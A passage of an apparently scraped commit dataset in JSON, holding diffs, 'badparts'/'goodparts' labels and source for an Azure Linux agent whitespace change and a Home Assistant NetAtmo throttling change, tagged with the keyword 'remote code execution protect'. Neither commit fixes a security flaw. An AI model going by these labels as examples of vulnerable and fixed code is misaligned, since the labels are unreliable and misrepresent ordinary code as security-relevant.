"/azurelinuxagent/common/protocol/wire.py", "badparts": ["                            return"], "goodparts": ["                            return                "]}, {"diff": "\n                 local_file = os.path.join(conf.get_lib_dir(), local_file)\n                 xml_text = self.fetch_cache(local_file)\n                 self.ext_conf = ExtensionsConfig(xml_text)\n-        return self.ext_conf\n+        return self.ext_conf      \n \n     def get_ext_manifest(self, ext_handler, goal_state):\n         for update_goal_state in [False, True]:\n", "add": 1, "remove": 1, "filename": "/azurelinuxagent/common/protocol/wire.py", "badparts": ["        return self.ext_conf"], "goodparts": ["        return self.ext_conf      "]}]}}, "msg": "JIT changes for AddUserAccount (#1171)\n\n* JIT changes for AddUserAccount\r\n\r\n* Code review updates 1\r\n\r\n* testing updates\r\n\r\n* UT test execution fixes\r\n\r\n* Fixing tests for python 2.7\r\n\r\n* python 2.6 UT fix\r\n\r\n* Adding RemoteAccess.xml parsing tests and data\r\n\r\n* Code round 2 updates\r\n\r\n* correctly decode password and stop using cache file\r\n\r\n* test fix for older versions of Python\r\n\r\n* more UTs\r\n\r\n* fix raising error when no remote access URI exists in Goal State\r\n\r\n* use incarnation and reduce force updates of goal_state\r\n\r\n* Code review changes\r\n\r\n* code review fixes\r\n\r\n* changed goal_state and remote_access refresh and added tests\r\n\r\n* enum change\r\n\r\n* Code revew changes"}}, "https://github.com/cvdv87/cvdv_home_assistant": {"9ea0c409e6cea69cce632079548165ad5a9f2554": {"url": "https://api.github.com/repos/cvdv87/cvdv_home_assistant/commits/9ea0c409e6cea69cce632079548165ad5a9f2554", "html_url": "https://github.com/cvdv87/cvdv_home_assistant/commit/9ea0c409e6cea69cce632079548165ad5a9f2554", "message": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting", "sha": "9ea0c409e6cea69cce632079548165ad5a9f2554", "keyword": "remote code execution protect", "diff": "diff --git a/homeassistant/components/sensor/netatmo.py b/homeassistant/components/sensor/netatmo.py\nindex 191e587fe..bdc2c5990 100644\n--- a/homeassistant/components/sensor/netatmo.py\n+++ b/homeassistant/components/sensor/netatmo.py\n@@ -5,7 +5,8 @@\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n@@ -14,7 +15,6 @@\n     TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n@@ -24,8 +24,8 @@\n \n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n@@ -50,7 +50,8 @@\n     'rf_status': ['Radio', '', 'mdi:signal', None],\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n@@ -76,11 +77,11 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n             # Iterate each module\n             for module_name, monitored_conditions in\\\n                     config[CONF_MODULES].items():\n-                # Test if module exist \"\"\"\n+                # Test if module exists\n                 if module_name not in data.get_module_names():\n                     _LOGGER.error('Module name: \"%s\" not found', module_name)\n                     continue\n-                # Only create sensor for monitored \"\"\"\n+                # Only create sensors for monitored properties\n                 for variable in monitored_conditions:\n                     dev.append(NetAtmoSensor(data, module_name, variable))\n         else:\n@@ -285,6 +286,8 @@ def update(self):\n                 self._state = \"High\"\n             elif data['wifi_status'] <= 55:\n                 self._state = \"Full\"\n+        elif self.type == 'lastupdated':\n+            self._state = int(time() - data['When'])\n \n \n class NetAtmoData(object):\n@@ -296,20 +299,57 @@ def __init__(self, auth, station):\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "files": {"/homeassistant/components/sensor/netatmo.py": {"changes": [{"diff": "\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from datetime import timedelta"], "goodparts": ["from time import time", "import threading"]}, {"diff": "\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n", "add": 0, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from homeassistant.util import Throttle"], "goodparts": []}, {"diff": "\n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n", "add": 2, "remove": 2, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)"], "goodparts": ["NETATMO_UPDATE_INTERVAL = 600"]}, {"diff": "\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]"], "goodparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],", "    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],"]}, {"diff": "\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "add": 46, "remove": 9, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    @Throttle(MIN_TIME_BETWEEN_UPDATES)", "        \"\"\"Call the Netatmo API to update the data.\"\"\"", "        import pyatmo", "        self.station_data = pyatmo.WeatherStationData(self.auth)", "        if self.station is not None:", "            self.data = self.station_data.lastData(", "                station=self.station, exclude=3600)", "        else:", "            self.data = self.station_data.lastData(exclude=3600)"], "goodparts": ["        self._next_update = time()", "        self._update_in_progress = threading.Lock()", "        \"\"\"Call the Netatmo API to update the data.", "        This method is not throttled by the builtin Throttle decorator", "        but with a custom logic, which takes into account the time", "        of the last update from the cloud.", "        \"\"\"", "        if time() < self._next_update or \\", "                not self._update_in_progress.acquire(False):", "            return", "        try:", "            import pyatmo", "            self.station_data = pyatmo.WeatherStationData(self.auth)", "            if self.station is not None:", "                self.data = self.station_data.lastData(", "                    station=self.station, exclude=3600)", "            else:", "                self.data = self.station_data.lastData(exclude=3600)", "            newinterval = 0", "            for module in self.data:", "                if 'When' in self.data[module]:", "                    newinterval = self.data[module]['When']", "                    break", "            if newinterval:", "                newinterval += NETATMO_UPDATE_INTERVAL - time()", "                if newinterval > NETATMO_UPDATE_INTERVAL - 30:", "                    newinterval = NETATMO_UPDATE_INTERVAL", "                else:", "                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:", "                        newinterval = NETATMO_UPDATE_INTERVAL / 2", "                    _LOGGER.warning(", "                        \"NetAtmo refresh interval reset to %d seconds\",", "                        newinterval)", "            else:", "                newinterval = NETATMO_UPDATE_INTERVAL", "            self._next_update = time() + newinterval", "        finally:", "            self._update_in_progress.release()"]}], "source": "\n\"\"\" Support for the NetAtmo Weather Service. For more details about this platform, please refer to the documentation at https://home-assistant.io/components/sensor.netatmo/ \"\"\" import logging from datetime import timedelta import voluptuous as vol from homeassistant.components.sensor import PLATFORM_SCHEMA from homeassistant.const import( TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE, STATE_UNKNOWN) from homeassistant.helpers.entity import Entity from homeassistant.util import Throttle import homeassistant.helpers.config_validation as cv _LOGGER=logging.getLogger(__name__) CONF_MODULES='modules' CONF_STATION='station' DEPENDENCIES=['netatmo'] MIN_TIME_BETWEEN_UPDATES=timedelta(seconds=600) SENSOR_TYPES={ 'temperature':['Temperature', TEMP_CELSIUS, None, DEVICE_CLASS_TEMPERATURE], 'co2':['CO2', 'ppm', 'mdi:cloud', None], 'pressure':['Pressure', 'mbar', 'mdi:gauge', None], 'noise':['Noise', 'dB', 'mdi:volume-high', None], 'humidity':['Humidity', '%', None, DEVICE_CLASS_HUMIDITY], 'rain':['Rain', 'mm', 'mdi:weather-rainy', None], 'sum_rain_1':['sum_rain_1', 'mm', 'mdi:weather-rainy', None], 'sum_rain_24':['sum_rain_24', 'mm', 'mdi:weather-rainy', None], 'battery_vp':['Battery', '', 'mdi:battery', None], 'battery_lvl':['Battery_lvl', '', 'mdi:battery', None], 'min_temp':['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'max_temp':['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'windangle':['Angle', '', 'mdi:compass', None], 'windangle_value':['Angle Value', '\u00ba', 'mdi:compass', None], 'windstrength':['Strength', 'km/h', 'mdi:weather-windy', None], 'gustangle':['Gust Angle', '', 'mdi:compass', None], 'gustangle_value':['Gust Angle Value', '\u00ba', 'mdi:compass', None], 'guststrength':['Gust Strength', 'km/h', 'mdi:weather-windy', None], 'rf_status':['Radio', '', 'mdi:signal', None], 'rf_status_lvl':['Radio_lvl', '', 'mdi:signal', None], 'wifi_status':['Wifi', '', 'mdi:wifi', None], 'wifi_status_lvl':['Wifi_lvl', 'dBm', 'mdi:wifi', None] } MODULE_SCHEMA=vol.Schema({ vol.Required(cv.string): vol.All(cv.ensure_list,[vol.In(SENSOR_TYPES)]), }) PLATFORM_SCHEMA=PLATFORM_SCHEMA.extend({ vol.Optional(CONF_STATION): cv.string, vol.Optional(CONF_MODULES): MODULE_SCHEMA, }) def setup_platform(hass, config, add_devices, discovery_info=None): \"\"\"Set up the available Netatmo weather sensors.\"\"\" netatmo=hass.components.netatmo data=NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None)) dev=[] import pyatmo try: if CONF_MODULES in config: for module_name, monitored_conditions in\\ config[CONF_MODULES].items(): if module_name not in data.get_module_names(): _LOGGER.error('Module name: \"%s\" not found', module_name) continue for variable in monitored_conditions: dev.append(NetAtmoSensor(data, module_name, variable)) else: for module_name in data.get_module_names(): for variable in\\ data.station_data.monitoredConditions(module_name): if variable in SENSOR_TYPES.keys(): dev.append(NetAtmoSensor(data, module_name, variable)) else: _LOGGER.warning(\"Ignoring unknown var %s for mod %s\", variable, module_name) except pyatmo.NoDevice: return None add_devices(dev, True) class NetAtmoSensor(Entity): \"\"\"Implementation of a Netatmo sensor.\"\"\" def __init__(self, netatmo_data, module_name, sensor_type): \"\"\"Initialize the sensor.\"\"\" self._name='Netatmo{}{}'.format(module_name, SENSOR_TYPES[sensor_type][0]) self.netatmo_data=netatmo_data self.module_name=module_name self.type=sensor_type self._state=None self._device_class=SENSOR_TYPES[self.type][3] self._icon=SENSOR_TYPES[self.type][2] self._unit_of_measurement=SENSOR_TYPES[self.type][1] module_id=self.netatmo_data.\\ station_data.moduleByName(module=module_name)['_id'] self.module_id=module_id[1] @property def name(self): \"\"\"Return the name of the sensor.\"\"\" return self._name @property def icon(self): \"\"\"Icon to use in the frontend, if any.\"\"\" return self._icon @property def device_class(self): \"\"\"Return the device class of the sensor.\"\"\" return self._device_class @property def state(self): \"\"\"Return the state of the device.\"\"\" return self._state @property def unit_of_measurement(self): \"\"\"Return the unit of measurement of this entity, if any.\"\"\" return self._unit_of_measurement def update(self): \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\" self.netatmo_data.update() data=self.netatmo_data.data.get(self.module_name) if data is None: _LOGGER.warning(\"No data found for %s\", self.module_name) self._state=STATE_UNKNOWN return if self.type=='temperature': self._state=round(data['Temperature'], 1) elif self.type=='humidity': self._state=data['Humidity'] elif self.type=='rain': self._state=data['Rain'] elif self.type=='sum_rain_1': self._state=data['sum_rain_1'] elif self.type=='sum_rain_24': self._state=data['sum_rain_24'] elif self.type=='noise': self._state=data['Noise'] elif self.type=='co2': self._state=data['CO2'] elif self.type=='pressure': self._state=round(data['Pressure'], 1) elif self.type=='battery_lvl': self._state=data['battery_vp'] elif self.type=='battery_vp' and self.module_id=='6': if data['battery_vp'] >=5590: self._state=\"Full\" elif data['battery_vp'] >=5180: self._state=\"High\" elif data['battery_vp'] >=4770: self._state=\"Medium\" elif data['battery_vp'] >=4360: self._state=\"Low\" elif data['battery_vp'] < 4360: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='5': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='3': if data['battery_vp'] >=5640: self._state=\"Full\" elif data['battery_vp'] >=5280: self._state=\"High\" elif data['battery_vp'] >=4920: self._state=\"Medium\" elif data['battery_vp'] >=4560: self._state=\"Low\" elif data['battery_vp'] < 4560: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='2': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='min_temp': self._state=data['min_temp'] elif self.type=='max_temp': self._state=data['max_temp'] elif self.type=='windangle_value': self._state=data['WindAngle'] elif self.type=='windangle': if data['WindAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif self.type=='windstrength': self._state=data['WindStrength'] elif self.type=='gustangle_value': self._state=data['GustAngle'] elif self.type=='gustangle': if data['GustAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif self.type=='guststrength': self._state=data['GustStrength'] elif self.type=='rf_status_lvl': self._state=data['rf_status'] elif self.type=='rf_status': if data['rf_status'] >=90: self._state=\"Low\" elif data['rf_status'] >=76: self._state=\"Medium\" elif data['rf_status'] >=60: self._state=\"High\" elif data['rf_status'] <=59: self._state=\"Full\" elif self.type=='wifi_status_lvl': self._state=data['wifi_status'] elif self.type=='wifi_status': if data['wifi_status'] >=86: self._state=\"Low\" elif data['wifi_status'] >=71: self._state=\"Medium\" elif data['wifi_status'] >=56: self._state=\"High\" elif data['wifi_status'] <=55: self._state=\"Full\" class NetAtmoData(object): \"\"\"Get the latest data from NetAtmo.\"\"\" def __init__(self, auth, station): \"\"\"Initialize the data object.\"\"\" self.auth=auth self.data=None self.station_data=None self.station=station def get_module_names(self): \"\"\"Return all module available on the API as a list.\"\"\" self.update() return self.data.keys() @Throttle(MIN_TIME_BETWEEN_UPDATES) def update(self): \"\"\"Call the Netatmo API to update the data.\"\"\" import pyatmo self.station_data=pyatmo.WeatherStationData(self.auth) if self.station is not None: self.data=self.station_data.lastData( station=self.station, exclude=3600) else: self.data=self.station_data.lastData(exclude=3600) ", "sourceWithComments": "\"\"\"\nSupport for the NetAtmo Weather Service.\n\nFor more details about this platform, please refer to the documentation at\nhttps://home-assistant.io/components/sensor.netatmo/\n\"\"\"\nimport logging\nfrom datetime import timedelta\n\nimport voluptuous as vol\n\nfrom homeassistant.components.sensor import PLATFORM_SCHEMA\nfrom homeassistant.const import (\n    TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n    STATE_UNKNOWN)\nfrom homeassistant.helpers.entity import Entity\nfrom homeassistant.util import Throttle\nimport homeassistant.helpers.config_validation as cv\n\n_LOGGER = logging.getLogger(__name__)\n\nCONF_MODULES = 'modules'\nCONF_STATION = 'station'\n\nDEPENDENCIES = ['netatmo']\n\n# NetAtmo Data is uploaded to server every 10 minutes\nMIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n\nSENSOR_TYPES = {\n    'temperature': ['Temperature', TEMP_CELSIUS, None,\n                    DEVICE_CLASS_TEMPERATURE],\n    'co2': ['CO2', 'ppm', 'mdi:cloud', None],\n    'pressure': ['Pressure', 'mbar', 'mdi:gauge', None],\n    'noise': ['Noise', 'dB', 'mdi:volume-high', None],\n    'humidity': ['Humidity', '%', None, DEVICE_CLASS_HUMIDITY],\n    'rain': ['Rain', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_1': ['sum_rain_1', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_24': ['sum_rain_24', 'mm', 'mdi:weather-rainy', None],\n    'battery_vp': ['Battery', '', 'mdi:battery', None],\n    'battery_lvl': ['Battery_lvl', '', 'mdi:battery', None],\n    'min_temp': ['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'max_temp': ['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'windangle': ['Angle', '', 'mdi:compass', None],\n    'windangle_value': ['Angle Value', '\u00ba', 'mdi:compass', None],\n    'windstrength': ['Strength', 'km/h', 'mdi:weather-windy', None],\n    'gustangle': ['Gust Angle', '', 'mdi:compass', None],\n    'gustangle_value': ['Gust Angle Value', '\u00ba', 'mdi:compass', None],\n    'guststrength': ['Gust Strength', 'km/h', 'mdi:weather-windy', None],\n    'rf_status': ['Radio', '', 'mdi:signal', None],\n    'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n    'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n}\n\nMODULE_SCHEMA = vol.Schema({\n    vol.Required(cv.string):\n        vol.All(cv.ensure_list, [vol.In(SENSOR_TYPES)]),\n})\n\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\n    vol.Optional(CONF_STATION): cv.string,\n    vol.Optional(CONF_MODULES): MODULE_SCHEMA,\n})\n\n\ndef setup_platform(hass, config, add_devices, discovery_info=None):\n    \"\"\"Set up the available Netatmo weather sensors.\"\"\"\n    netatmo = hass.components.netatmo\n    data = NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None))\n\n    dev = []\n    import pyatmo\n    try:\n        if CONF_MODULES in config:\n            # Iterate each module\n            for module_name, monitored_conditions in\\\n                    config[CONF_MODULES].items():\n                # Test if module exist \"\"\"\n                if module_name not in data.get_module_names():\n                    _LOGGER.error('Module name: \"%s\" not found', module_name)\n                    continue\n                # Only create sensor for monitored \"\"\"\n                for variable in monitored_conditions:\n                    dev.append(NetAtmoSensor(data, module_name, variable))\n        else:\n            for module_name in data.get_module_names():\n                for variable in\\\n                        data.station_data.monitoredConditions(module_name):\n                    if variable in SENSOR_TYPES.keys():\n                        dev.append(NetAtmoSensor(data, module_name, variable))\n                    else:\n                        _LOGGER.warning(\"Ignoring unknown var %s for mod %s\",\n                                        variable, module_name)\n    except pyatmo.NoDevice:\n        return None\n\n    add_devices(dev, True)\n\n\nclass NetAtmoSensor(Entity):\n    \"\"\"Implementation of a Netatmo sensor.\"\"\"\n\n    def __init__(self, netatmo_data, module_name, sensor_type):\n        \"\"\"Initialize the sensor.\"\"\"\n        self._name = 'Netatmo {} {}'.format(module_name,\n                                            SENSOR_TYPES[sensor_type][0])\n        self.netatmo_data = netatmo_data\n        self.module_name = module_name\n        self.type = sensor_type\n        self._state = None\n        self._device_class = SENSOR_TYPES[self.type][3]\n        self._icon = SENSOR_TYPES[self.type][2]\n        self._unit_of_measurement = SENSOR_TYPES[self.type][1]\n        module_id = self.netatmo_data.\\\n            station_data.moduleByName(module=module_name)['_id']\n        self.module_id = module_id[1]\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the sensor.\"\"\"\n        return self._name\n\n    @property\n    def icon(self):\n        \"\"\"Icon to use in the frontend, if any.\"\"\"\n        return self._icon\n\n    @property\n    def device_class(self):\n        \"\"\"Return the device class of the sensor.\"\"\"\n        return self._device_class\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the device.\"\"\"\n        return self._state\n\n    @property\n    def unit_of_measurement(self):\n        \"\"\"Return the unit of measurement of this entity, if any.\"\"\"\n        return self._unit_of_measurement\n\n    def update(self):\n        \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\"\n        self.netatmo_data.update()\n        data = self.netatmo_data.data.get(self.module_name)\n\n        if data is None:\n            _LOGGER.warning(\"No data found for %s\", self.module_name)\n            self._state = STATE_UNKNOWN\n            return\n\n        if self.type == 'temperature':\n            self._state = round(data['Temperature'], 1)\n        elif self.type == 'humidity':\n            self._state = data['Humidity']\n        elif self.type == 'rain':\n            self._state = data['Rain']\n        elif self.type == 'sum_rain_1':\n            self._state = data['sum_rain_1']\n        elif self.type == 'sum_rain_24':\n            self._state = data['sum_rain_24']\n        elif self.type == 'noise':\n            self._state = data['Noise']\n        elif self.type == 'co2':\n            self._state = data['CO2']\n        elif self.type == 'pressure':\n            self._state = round(data['Pressure'], 1)\n        elif self.type == 'battery_lvl':\n            self._state = data['battery_vp']\n        elif self.type == 'battery_vp' and self.module_id == '6':\n            if data['battery_vp'] >= 5590:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5180:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4770:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4360:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4360:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '5':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '3':\n            if data['battery_vp'] >= 5640:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5280:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4920:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4560:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4560:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '2':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'min_temp':\n            self._state = data['min_temp']\n        elif self.type == 'max_temp':\n            self._state = data['max_temp']\n        elif self.type == 'windangle_value':\n            self._state = data['WindAngle']\n        